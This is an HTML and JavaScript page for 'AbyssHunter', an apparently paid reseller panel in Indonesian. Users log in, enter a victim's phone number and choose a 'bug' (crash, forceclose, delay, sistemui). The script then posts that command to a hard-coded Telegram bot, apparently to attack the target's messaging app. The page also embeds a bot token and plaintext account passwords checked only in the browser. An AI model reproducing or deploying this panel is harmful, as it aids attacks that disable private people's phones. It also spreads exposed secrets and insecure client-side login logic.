<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>AbyssHunter</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  html,body{height:100%}
  body{
    font-family:'Segoe UI',system-ui,Roboto,Arial,sans-serif;
    background:#000 url('https://files.catbox.moe/u1ds54.jpg') center/cover fixed;
    color:#eee;
  }
  .wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px;flex-direction:column}

  /* LOGIN CARD */
  .login-card{
    width:100%;max-width:480px;
    background:linear-gradient(180deg,rgba(20,8,8,0.78),rgba(0,0,0,0.85));
    border-radius:18px;padding:28px;
    box-shadow:0 20px 60px rgba(0,0,0,0.7);
    text-align:center;
    margin-bottom:20px;
  }
  .login-title{font-size:22px;margin-bottom:10px;color:#0ff;text-shadow:0 0 6px #0ff}
  .logo-wrap{width:150px;height:150px;margin:14px auto;border-radius:14px;overflow:hidden}
  .logo-wrap img{width:100%;height:100%;object-fit:cover}
  .field{margin-top:12px}
  input[type="text"],input[type="password"]{
    width:100%;padding:14px 16px;font-size:15px;
    border-radius:8px;border:2px solid rgba(0,255,255,0.18);
    background:rgba(30,0,0,0.25);color:#fff;
    outline:none;
  }
  .btn-login{
    width:100%;margin-top:14px;padding:14px;font-weight:700;font-size:16px;
    color:#000;background:linear-gradient(90deg,#0ff,#00aaff);
    border:none;border-radius:10px;cursor:pointer;
    box-shadow:0 0 10px #0ff,0 0 20px #0ff inset;
  }
  .btn-login:hover{transform:scale(1.05);box-shadow:0 0 20px #0ff,0 0 30px #0ff inset}

  /* DASHBOARD */
  .app{width:100%;max-width:480px}
  .profile-box{
    background:rgba(20,20,20,0.85);
    border-radius:20px;
    padding:25px;
    text-align:center;
    box-shadow:0 0 30px rgba(0,255,255,0.25);
    border:2px solid rgba(0,255,255,0.2);
    margin-bottom:20px;
  }
  .avatar{
    width:140px;
    height:140px;
    border-radius:50%;
    margin:0 auto 12px;
    overflow:hidden;
    border:3px solid #0ff;
    box-shadow:0 0 20px #0ff;
  }
  .avatar img{width:100%;height:100%;object-fit:cover}
  .name{
    font-size:26px;
    font-weight:700;
    color:#0ff;
    margin-bottom:6px;
    letter-spacing:1px;
    text-shadow:0 0 6px #0ff;
  }
  .meta{
    font-family:monospace;
    font-size:14px;
    color:#0ff;
    font-weight:700;
    letter-spacing:1px;
    text-shadow:0 0 6px #0ff;
  }

  .page h2, .page h3{text-align:center;color:#0ff;text-shadow:0 0 6px #0ff,0 0 12px #0ff}
  .page p{text-align:center;color:#ccc;margin-top:8px}

  .form-block{
    background:rgba(30,30,30,0.9);
    padding:20px;
    border-radius:18px;
    box-shadow:0 0 20px rgba(0,255,255,0.2);
    margin-top:15px;
  }
  .label{font-weight:700;margin:10px 4px;font-size:14px;color:#0ff}
  .input-ghost,.select-ghost{
    width:100%;
    padding:16px;
    border-radius:22px;
    border:2px solid rgba(0,255,255,0.2);
    background:rgba(0,0,0,0.6);
    color:#fff;font-size:16px;
    outline:none;
  }
  .send-btn{
    display:block;width:100%;padding:20px;font-size:20px;border-radius:22px;border:none;
    background:linear-gradient(180deg,#0ff,#00aaff);color:#000;font-weight:800;letter-spacing:2px;
    cursor:pointer;
    box-shadow:0 0 12px #0ff,0 0 24px #0ff inset;
  }
  .send-btn:hover{
    transform:scale(1.05);
    box-shadow:0 0 24px #0ff,0 0 36px #0ff inset;
  }

  .bottom-nav{
    display:flex;justify-content:space-between;gap:8px;
    margin-top:18px;background:rgba(0,0,0,0.6);
    padding:12px 14px;border-radius:12px;
    box-shadow:0 0 12px #0ff;
  }
  .nav-item{
    flex:1;text-align:center;cursor:pointer;color:#0ff;font-weight:600;
    transition:0.2s;
  }
  .nav-item:hover{color:#fff;text-shadow:0 0 6px #0ff,0 0 12px #0ff}
  .nav-item i{display:block;font-size:22px;margin-bottom:6px}

  /* NOTIF POPUP */
  #notif{
    position:fixed;
    top:50%;
    left:50%;
    transform:translate(-50%,-50%) scale(0);
    background:linear-gradient(180deg,#0ff,#00aaff);
    color:#000;
    padding:20px 30px;
    border-radius:18px;
    font-weight:700;
    font-size:18px;
    letter-spacing:1px;
    text-align:center;
    box-shadow:0 0 20px #0ff,0 0 30px #0ff inset;
    display:block;
    z-index:9999;
    transition:0.3s ease;
    opacity:0;
  }
  #notif.show{
    opacity:1;
    transform:translate(-50%,-50%) scale(1);
  }
</style>
</head>
<body>
<div class="wrap">

  <!-- LOGIN VIEW -->
  <div id="view-login" class="login-card">
    <div class="login-title">Login to Continue</div>
    <div class="logo-wrap"><img src="https://i.ibb.co/7z6jYFq/avatar-dev.png" alt="logo"></div>
    <div class="field"><input id="inUser" type="text" placeholder="USERNAME"></div>
    <div class="field"><input id="inPass" type="password" placeholder="PASSWORD"></div>
    <button class="btn-login" onclick="doLogin()">LOGIN</button>
  </div>

  <!-- DASHBOARD VIEW -->
  <div id="view-dash" style="display:none;">
    <div class="app">

      <div class="profile-box">
        <div class="avatar"><img id="pfImg" src="https://i.ibb.co/WBqykWc/avatar-reseller.png" alt="avatar"></div>
        <div class="name" id="pfName">username</div>
        <div class="meta" id="pfMeta">Role: RESELLER ¬∑ Exp: 2025-10-07</div>
      </div>

      <div id="content-home" class="page">
        <h2>Selamat Datang di AbyssHunter</h2>
        <p>Silakan pilih menu di bawah.</p>
      </div>

      <div id="content-bug" class="page" style="display:none">
        <div class="form-block">
          <div class="label">Target Number</div>
          <input id="target" class="input-ghost" placeholder="e.g. +62xxxxxxxxxx">
          <div class="label">Select Bug</div>
          <select id="bug" class="select-ghost">
            <option>crash</option>
            <option>forceclose</option>
            <option>delay</option>
            <option>sistemui</option>
          </select>
          <button class="send-btn" onclick="handleSend()">‚®Ç SEND BUG</button>
        </div>
      </div>

      <div id="content-act" class="page" style="display:none">
        <h3>Masa Aktif</h3>
        <p id="expInfo">Exp: -</p>
      </div>

      <div id="content-chat" class="page" style="display:none">
        <h3>Hubungi Admin</h3>
        <p>
          <button class="send-btn" onclick="contactAdmin()">üí¨ Chat Admin di Telegram</button>
        </p>
      </div>

      <div class="bottom-nav">
        <div class="nav-item" onclick="showPage('home')"><i>üè†</i>Home</div>
        <div class="nav-item" onclick="showPage('bug')"><i>üìû</i>Bug</div>
        <div class="nav-item" onclick="showPage('act')"><i>‚ö°</i>Act</div>
        <div class="nav-item" onclick="showPage('chat')"><i>üí¨</i>Chat</div>
      </div>

    </div>
  </div>

</div>

<!-- NOTIF -->
<div id="notif">Notifikasi</div>

<script>
const users=[
  {user:'Ryzen',pass:'Ryzen',role:'RESELLER',exp:'2025-10-07',avatar:'https://files.catbox.moe/u1ds54.jpg'},
  {user:'Fahz',pass:'Fahz121108',role:'DEVELOPER',exp:'2026-01-01',avatar:'https://files.catbox.moe/u1ds54.jpg'},
  {user:'alan',pass:'alan',role:'CEO',exp:'2025-12-30',avatar:'https://files.catbox.moe/u1ds54.jpg'},
  {user:'budi',pass:'budi',role:'OWNER',exp:'2025-11-20',avatar:'https://files.catbox.moe/u1ds54.jpg'},
  {user:'sari',pass:'sari',role:'PT',exp:'2025-10-15',avatar:'https://files.catbox.moe/u1ds54.jpg'},
  {user:'tk',pass:'tk',role:'TK',exp:'2025-09-30',avatar:'https://files.catbox.moe/u1ds54.jpg'}
];
let current=null;

function doLogin(){
  const u=document.getElementById('inUser').value.trim();
  const p=document.getElementById('inPass').value.trim();
  const found=users.find(x=>x.user===u&&x.pass===p);
  if(!found){alert('Login gagal');return;}
  const today=new Date().toISOString().split('T')[0];
  if(today>found.exp){alert('Akun expired');return;}
  current=found;
  document.getElementById('pfImg').src=found.avatar;
  document.getElementById('pfName').innerText=found.user;
  document.getElementById('pfMeta').innerText=`Role: ${found.role} ¬∑ Exp: ${found.exp}`;
  document.getElementById('expInfo').innerText=`Exp: ${found.exp}`;
  document.getElementById('view-login').style.display='none';
  document.getElementById('view-dash').style.display='block';
}

function showPage(page){
  document.querySelectorAll('.page').forEach(p=>p.style.display='none');
  document.getElementById('content-'+page).style.display='block';
}

function showNotif(msg){
  const n=document.getElementById('notif');
  n.innerText=msg;
  n.classList.add('show');
  setTimeout(()=>{ n.classList.remove('show'); },3000);
}

function handleSend(){
  const tgt=document.getElementById('target').value.trim();
  const bug=document.getElementById('bug').value;
  if(!current){alert('Login dulu');return;}
  if(!tgt){alert('Masukkan nomor target');return;}

  const BOT_TOKEN = "8294390030:AAGNRVAkLylpjMkF2a9o7bWB-0Q4xFvpcPc";
  const CHAT_ID = "8459065155";
  const text = `/${bug} ${tgt}`;
  
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({chat_id:CHAT_ID,text:text})
  })
  .then(res=>res.json())
  .then(data=>{
    if(data.ok){
      showNotif("‚úÖ Bug berhasil dikirim!");
    }else{
      showNotif("‚ùå Gagal kirim!");
    }
  })
  .catch(err=>{
    showNotif("‚ö†Ô∏è Error: "+err);
  });
}

function contactAdmin(){
  window.open("https://t.me/FahzOfficialNew","_blank");
}
</script>
</body>
 </html>
